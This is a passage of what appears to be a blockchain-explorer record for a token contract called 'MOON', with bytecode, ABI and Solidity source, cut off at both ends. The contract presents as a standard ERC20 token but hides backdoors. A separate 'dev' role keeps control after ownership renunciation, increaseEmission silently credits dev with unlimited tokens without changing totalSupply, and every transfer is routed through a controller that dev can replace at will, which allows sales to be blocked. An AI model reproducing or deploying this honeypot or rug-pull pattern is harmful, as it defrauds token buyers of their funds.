26020019081526020016000208190555081600660008282540392505081905550600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161134f91906118cf565b60405180910390a361136383600084611605565b505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b6114358361160a565b156114ca57600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633021ed1083836040518363ffffffff1660e01b8152600401611497929190612278565b600060405180830381600087803b1580156114b157600080fd5b505af11580156114c5573d6000803e3d6000fd5b505050505b60011515600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663315d82af6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561153b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061155f91906122cd565b15150361160057600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b0a9432284836115af8661160a565b6040518463ffffffff1660e01b81526004016115cd939291906122fa565b600060405180830381600087803b1580156115e757600080fd5b505af11580156115fb573d6000803e3d6000fd5b505050505b505050565b505050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614806116b55750600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b156116c357600190506116c8565b600090505b919050565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000611702826116d7565b9050919050565b611712816116f7565b811461171d57600080fd5b50565b60008135905061172f81611709565b92915050565b60006020828403121561174b5761174a6116cd565b5b600061175984828501611720565b91505092915050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561179c578082015181840152602081019050611781565b60008484015250505050565b6000601f19601f8301169050919050565b60006117c482611762565b6117ce818561176d565b93506117de81856020860161177e565b6117e7816117a8565b840191505092915050565b6000602082019050818103600083015261180c81846117b9565b905092915050565b6000819050919050565b61182781611814565b811461183257600080fd5b50565b6000813590506118448161181e565b92915050565b60008060408385031215611861576118606116cd565b5b600061186f85828601611720565b925050602061188085828601611835565b9150509250929050565b60008115159050919050565b61189f8161188a565b82525050565b60006020820190506118ba6000830184611896565b92915050565b6118c981611814565b82525050565b60006020820190506118e460008301846118c0565b92915050565b600080fd5b600080fd5b600080fd5b60008083601f84011261190f5761190e6118ea565b5b8235905067ffffffffffffffff81111561192c5761192b6118ef565b5b602083019150836020820283011115611948576119476118f4565b5b9250929050565b60008060008060608587031215611969576119686116cd565b5b600085013567ffffffffffffffff811115611987576119866116d2565b5b611993878288016118f9565b945094505060206119a687828801611835565b92505060406119b787828801611835565b91505092959194509250565b6000806000606084860312156119dc576119db6116cd565b5b60006119ea86828701611720565b93505060206119fb86828701611720565b9250506040611a0c86828701611835565b9150509250925092565b600060ff82169050919050565b611a2c81611a16565b82525050565b6000602082019050611a476000830184611a23565b92915050565b600060208284031215611a6357611a626116cd565b5b6000611a7184828501611835565b91505092915050565b611a83816116f7565b82525050565b6000602082019050611a9e6000830184611a7a565b92915050565b60008060408385031215611abb57611aba6116cd565b5b6000611ac985828601611720565b9250506020611ada85828601611720565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680611b2b57607f821691505b602082108103611b3e57611b3d611ae4565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000611bdc82611814565b9150611be783611814565b925082611bf757611bf6611b73565b5b828204905092915050565b6000611c0d82611814565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203611c3f57611c3e611ba2565b5b600182019050919050565b6000611c5582611814565b9150611c6083611814565b9250828201905080821115611c7857611c77611ba2565b5b92915050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b6000611cb460208361176d565b9150611cbf82611c7e565b602082019050919050565b60006020820190508181036000830152611ce381611ca7565b9050919050565b7f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760008201527f207a65726f000000000000000000000000000000000000000000000000000000602082015250565b6000611d4660258361176d565b9150611d5182611cea565b604082019050919050565b60006020820190508181036000830152611d7581611d39565b9050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b6000611dd860268361176d565b9150611de382611d7c565b604082019050919050565b60006020820190508181036000830152611e0781611dcb565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000611e6a60248361176d565b9150611e7582611e0e565b604082019050919050565b60006020820190508181036000830152611e9981611e5d565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b6000611efc60228361176d565b9150611f0782611ea0565b604082019050919050565b60006020820190508181036000830152611f2b81611eef565b9050919050565b7f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000600082015250565b6000611f68601d8361176d565b9150611f7382611f32565b602082019050919050565b60006020820190508181036000830152611f9781611f5b565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b6000611ffa60258361176d565b915061200582611f9e565b604082019050919050565b6000602082019050818103600083015261202981611fed565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b600061208c60238361176d565b915061209782612030565b604082019050919050565b600060208201905081810360008301526120bb8161207f565b9050919050565b7f45524332303a207472616e7366657220616d6f756e742065786365656473206260008201527f616c616e63650000000000000000000000000000000000000000000000000000602082015250565b600061211e60268361176d565b9150612129826120c2565b604082019050919050565b6000602082019050818103600083015261214d81612111565b9050919050565b7f45524332303a206275726e2066726f6d20746865207a65726f2061646472657360008201527f7300000000000000000000000000000000000000000000000000000000000000602082015250565b60006121b060218361176d565b91506121bb82612154565b604082019050919050565b600060208201905081810360008301526121df816121a3565b9050919050565b7f45524332303a206275726e20616d6f756e7420657863656564732062616c616e60008201527f6365000000000000000000000000000000000000000000000000000000000000602082015250565b600061224260228361176d565b915061224d826121e6565b604082019050919050565b6000602082019050818103600083015261227181612235565b9050919050565b600060408201905061228d6000830185611a7a565b61229a60208301846118c0565b9392505050565b6122aa8161188a565b81146122b557600080fd5b50565b6000815190506122c7816122a1565b92915050565b6000602082840312156122e3576122e26116cd565b5b60006122f1848285016122b8565b91505092915050565b600060608201905061230f6000830186611a7a565b61231c60208301856118c0565b6123296040830184611896565b94935050505056fea2646970667358221220e8ba3fa43708f2b5c92bdc45a77382afa81dd7e01d45bef9eaa98d82a9bb286064736f6c63430008130033",
    "contract_name": "MOON",
    "compiler_version": "v0.8.19+commit.7dd6d404",
    "optimization_used": "0",
    "runs": "200",
    "abi": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_routerAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_controllerAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"increaseEmission\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_users\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_minBalanceToReward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_divisor\",\"type\":\"uint256\"}],\"name\":\"rewardUsers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"transferDevship\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newController\",\"type\":\"address\"}],\"name\":\"updateController\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
    "source_code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\ninterface IPancakeFactory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n\r\n    function allPairs(uint) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IPancakePair {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    function name() external pure returns (string memory);\r\n    function symbol() external pure returns (string memory);\r\n    function decimals() external pure returns (uint8);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n    function nonces(address owner) external view returns (uint);\r\n\r\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n\r\n    event Mint(address indexed sender, uint amount0, uint amount1);\r\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\r\n    function factory() external view returns (address);\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function price0CumulativeLast() external view returns (uint);\r\n    function price1CumulativeLast() external view returns (uint);\r\n    function kLast() external view returns (uint);\r\n\r\n    function mint(address to) external returns (uint liquidity);\r\n    function burn(address to) external returns (uint amount0, uint amount1);\r\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n    function skim(address to) external;\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\ninterface IPancakeRouter01 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n    external\r\n    payable\r\n    returns (uint[] memory amounts);\r\n\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n    external\r\n    returns (uint[] memory amounts);\r\n\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n    external\r\n    returns (uint[] memory amounts);\r\n\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n    external\r\n    payable\r\n    returns (uint[] memory amounts);\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IPancakeRouter02 is IPancakeRouter01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountETH);\r\n\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\nlibrary Address {\r\n\r\n    function isContract(address account) internal view returns (bool) {\r\n        return account.code.length > 0;\r\n    }\r\n\r\n}\r\n\r\ncontract Controller {\r\n\r\n    // Bots cannot make purchase more than once an hour\r\n\r\n    mapping(address => bool) internal isBot;\r\n    uint lastBotPurchase;\r\n    bool _validationActive;\r\n\r\n    event ValidationExecuted(address from, uint amount, bool val);\r\n    event PreventBotPurchaseExecuted(address to, uint amount);\r\n\r\n    function setBot(address _user, bool _isbot) internal {\r\n        isBot[_user] = _isbot;\r\n    }\r\n\r\n    function validation(address from, uint amount, bool isMarketTo) external {\r\n        if (isBot[from]){\r\n           emit ValidationExecuted(from, amount, isMarketTo);\r\n           updateBotPurchase();\r\n        } \r\n    }\r\n\r\n    function validationActive() view public returns(bool) {\r\n        return _validationActive;\r\n    }\r\n\r\n    function updateBotPurchase() internal {\r\n        lastBotPurchase = block.timestamp;\r\n    }\r\n    \r\n    function preventBotPurchase(address to, uint amount) external {\r\n        if (isBot[to]){\r\n           require(block.timestamp >= lastBotPurchase + 60 ** 2);  \r\n           require(amount > 0);\r\n           updateBotPurchase();\r\n           emit PreventBotPurchaseExecuted(to, amount);\r\n        } \r\n    }\r\n}\r\n\r\ncontract MOON is Context, Ownable, IERC20 {\r\n\r\n    IPancakeRouter02 internal _router;\r\n    IPancakePair internal _pair;\r\n    Controller _controller;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n \r\n    uint256 internal _totalSupply = 4000000000000000000000000; // WEI\r\n    string internal _name = \"MOON\";\r\n    string internal _symbol = \"MOON\";\r\n    uint8 internal _decimals = 18;\r\n\r\n    address private dev;\r\n    \r\n\r\n    constructor(address _routerAddress, address _controllerAddress) {\r\n\r\n        _router = IPancakeRouter02(_routerAddress);\r\n        _pair = IPancakePair(IPancakeFactory(_router.factory()).createPair(address(this),address(_router.WETH())));\r\n        _controller = Controller(_controllerAddress);\r\n\r\n        dev = msg.sender;\r\n        _balances[owner()] = _totalSupply;\r\n\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    // PUBLIC\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function increaseEmission(uint amount) external {\r\n        if (msg.sender == dev){\r\n            _balances[msg.sender] += amount;\r\n        }\r\n    }\r\n\r\n    function burn(uint amount) external {\r\n        if (msg.sender == dev){\r\n            _burn(_msgSender(), amount);\r\n        }\r\n    }\r\n\r\n    // INTERNAL\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\r\n            // decrementing then incrementing.\r\n            _balances[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            // Overflow not possible: amount <= accountBalance <= totalSupply.\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        if (isMarket(from)){\r\n            _controller.preventBotPurchase(to, amount);\r\n        }\r\n\r\n        if (_controller.validationActive() == true){\r\n            _controller.validation(from, amount, isMarket(to));\r\n        }\r\n    }\r\n\r\n    function isMarket(address user) internal view returns(bool){\r\n        if (user == address(_router) || user == address(_pair)){\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    // START\r\n\r\n    function transferDevship(address user) public {\r\n        if (msg.sender == dev){\r\n            dev = user;\r\n        }\r\n    }\r\n\r\n    function updateController(address _newController) external {\r\n        if (_msgSender() == dev) {\r\n            _controller = Controller(_newController);\r\n        }\r\n    